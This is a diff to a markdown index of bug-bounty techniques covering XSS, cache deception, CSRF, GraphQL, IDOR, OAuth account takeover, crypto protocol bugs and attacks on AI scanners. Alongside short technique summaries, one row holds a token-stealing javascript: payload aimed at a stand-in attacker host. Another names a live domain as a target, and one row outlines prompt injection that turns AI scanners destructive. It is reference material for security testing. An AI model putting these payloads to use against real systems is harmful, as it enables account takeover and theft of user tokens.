@@ -18,10 +18,52 @@
 | **Sanitizer API bypass** | #170 | Chrome Sanitizer API: xlink:href + URL reparsing |
 | **Blind XSS** | #144 | BlindXSS Dorker — recon tool for blind XSS points |
 | **Filter/WAF bypass** | #175 | 150+ XSS writeups collection from Awesome-Bugbounty-Writeups |
+| **Filename XSS → admin panel stored XSS** | #187 | Legacy admin panels render filenames without escaping — P3 in user view, P1 in admin view |
+| **P4 → P1 chain (open redirect + OAuth)** | #186 | Same-domain open redirect + OAuth `redirect_uri` = one-click ATO |
 
 **Workflows:** `01-web-app-hunt.md` (Phase 3 — client-side testing)
 **Skills:** `parser-differential-tester.md`
 **Methodologies:** `07-logic-bug-hunting.md`
+
+---
+
+## Web Cache Poisoning & Deception
+
+| When Stuck On... | INBOX Entry | What It Gives You |
+|---|---|---|
+| **Cache poisoning playbook (4 phases)** | #189 | Cache fingerprinting → unkeyed input discovery → exploit → cache-buster awareness |
+| **Unkeyed input enumeration** | #189 | `X-Forwarded-Host`, `X-Original-URL`, `X-Host`, `X-Forwarded-Scheme` — strip one header at a time |
+| **Web cache deception (JWT theft)** | #196 | `.css` suffix on private paths → CDN caches → JWT in response → $2k |
+| **SameSite bypass via cache deception** | #196 | `SameSite=Lax` cookies + top-level nav to `.css` path = ATO primitive |
+| **Param Miner / Smuggler** | #189 | Burp extensions for unkeyed input + request smuggling |
+
+**Workflows:** `01-web-app-hunt.md` (Phase 7 — CDN/Cache)
+**Steering:** "Cache poisoning = XSS amplified to all visitors, including unauthenticated paths"
+
+---
+
+## CSRF (Cross-Site Request Forgery)
+
+| When Stuck On... | INBOX Entry | What It Gives You |
+|---|---|---|
+| **CSRF basics + state-change enumeration** | #049 | Content-Type bypass + XS-Leak — every state change is testable |
+| **CSRF on non-financial endpoints ($575)** | #192 | Trigger payment receipt emails without user consent — spam + phishing vector |
+| **CSRF endpoint discovery** | #192 | Enumerate: emails, cart add/remove, wishlist, 2FA toggles, notification prefs, support tickets, API key generation, OAuth tokens, magic links |
+
+**Workflows:** `02-api-security-hunt.md` (Phase 5 — CSRF)
+
+---
+
+## GraphQL
+
+| When Stuck On... | INBOX Entry | What It Gives You |
+|---|---|---|
+| **GraphQL 8-step methodology** | #198 | Introspection, field-level authz, alias batching DoS, subscription SSRF, directive abuse, type confusion, GraphQL injection, APQ hash confusion |
+| **GraphQL tools** | #198 | `graphql-cop`, `clairvoyance`, `InQL` (Burp), `graphqlmap` |
+| **Alias batching DoS** | #198 | 1000 aliases of expensive query bypass per-alias rate limiter |
+
+**Workflows:** `02-api-security-hunt.md` (Phase 4 — GraphQL)
+**Steering:** "If a target has `/graphql`, `/graphiql`, or `/api/graphql`, this is the highest-ROI surface to test"
 
 ---
 
@@ -55,6 +97,9 @@
 | **Front-end secrets + IDOR** | #123 | skraft9 API key leak + IDOR chain |
 | **Mass data exposure** | #106 | showAllAccounts.json production data leak |
 | **Old program → new IDOR** | #040 | $9k from old Bugcrowd program |
+| **Partner API broken access control ($40M exposure)** | #195 | Exolix — `partner_id` not authenticated → 355,944 swaps, 7 partners, XMR-heavy KYC leak |
+| **Mobile app IDOR via endpoint rewriting ($500)** | #197 | Decompile APK with jadx → extract static API key + UUID endpoint → swap UUIDs from curl |
+| **403 ≠ denial** | #191 | 20+ bypass techniques: path confusion, method tampering, header injection, encoding, host, scheme |
 
 **Workflows:** `01-web-app-hunt.md`, `02-api-security-hunt.md`
 **Skills:** `recon-basic.md`
@@ -88,6 +133,9 @@
 | **Password reset CSRF** | ATO-Via-Password-Reset | If no CSRF token → victim visits attacker page → password changed silently |
 | **OTP bypass: stateless verificationId** | #178 | Identity field swap at verification step — verificationId not bound to user server-side |
 | **OTP bypass: verification logic flaw ($3k)** | #183 | Swap loginId in PUT body at final verification — server trusts re-supplied identity |
+| **Open redirect → OAuth token theft chain (P1)** | #186 | Same-domain open redirect + OAuth `redirect_uri` = ATO — never report P4 open redirect on OAuth host without chaining |
+| **javascript: scheme steals sessionStorage** | #190 | `?redirectUrl=javascript:fetch('//attacker/?t='+localStorage.getItem('oauth_token'))` — post-auth redirect params |
+| **Custom SSO ATO (Okta/Auth0 misconfig)** | #194 | 4 misconfigs: open registration + SSO discovery, email not bound at JWT issue, SAML response replay, Auth0 `redirect_uri` open redirect |
 
 **Workflows:** `01-web-app-hunt.md`
 **Methodologies:** `02-oauth-security-testing.md`
@@ -126,6 +174,8 @@
 | **Race condition logic** | #088 | Bypass free plan restrictions |
 | **Bridge logic patterns** | #131 | Cross-chain bridge accounting logic |
 | **Solana router logic ($ drain)** | #016 | Router accounting + decimal precision |
+| **PortSwigger 9-lab business logic walkthrough** | #188 | Apprentice→Expert: client-side trust, state machine, inconsistent controls, integer overflow, Unicode, type coercion, dual-use endpoint, auth bypass |
+| **Threat modeling > bug hunting** | #201 | Map trust boundaries, find assumption most likely to be wrong, test that — 10x hit rate |
 
 **Workflows:** `04-crypto-hunt.md`, `05-adaptive-hunt.md`
 **Methodologies:** `07-logic-bug-hunting.md`
@@ -157,6 +207,8 @@
 | **Password Reset ATO (NEW)** | ATO-Via-Password-Reset repo | Complete password reset methodology: email manipulation (array, \r\n, JSON), host header poison, token reuse, IDOR, race conditions, rate-limit bypass, hidden API scanning, referrer manipulation, email canonicalization bypass, CSRF. **Apply to**: Strapi admin panels, Web3 dashboards, Privy auth flows. **Our target**: acpx.virtuals.io Strapi forgot-password endpoint. |
 | **SquidRouterModule safe drain (~$3M)** | #176 | 86 Gnosis Safes drained via executeSameChainActions() delegatecall impersonation — Foundry exploit contracts |
 | **WUSD/GLOVE sybil reward abuse (~$19.7k)** | #177 | _englove() called before fund pull — balance-based gate bypassed with fresh helper addresses |
+| **Verus Bridge exploit ($11.5M loss)** | #193 | Cross-chain bridge accepts user-supplied `sourceChainId` — not validated against signing chain — 75% white-hat recovered |
+| **$50M+ lost in crypto in 30 days** | #202 | 90% from protocol logic bugs — input validation, access control, state machine, cross-chain verification, reward sybil |
 
 **Workflows:** `04-crypto-hunt.md`
 **Methodologies:** `07-logic-bug-hunting.md`
@@ -182,6 +234,8 @@
 | **AI scanner indirect prompt injection** | #182 | Full methodology: inject stored content → AI scanner performs destructive actions / exfiltrates data |
 | **AI scanner routing-based SSRF** | #182 | Host header manipulation + prompt injection → scanner as programmable SSRF vector inside internal network |
 | **PortSwigger AI scanner labs** | #185 | 3 hands-on labs (Apprentice ×2, Practitioner ×1) for AI scanner exploitation |
+| **Zcash Zebra: AI agent found 1H + 1M in 24h** | #199 | Autonomous agent read 100% of Rust code, generated PoC, validated in sandbox — ~$1,500 in tokens |
+| **AI engineering: hunt conditions, not bugs** | #200 | Conditions = {precondition, trigger, observable_effect} — AI enumerates (auth × param × value) matrix, validates in parallel |
 
 **Workflows:** `03-ai-app-hunt.md`
 **Methodologies:** `05-prompt-injection-framework.md`, `06-mcp-security-audit.md`
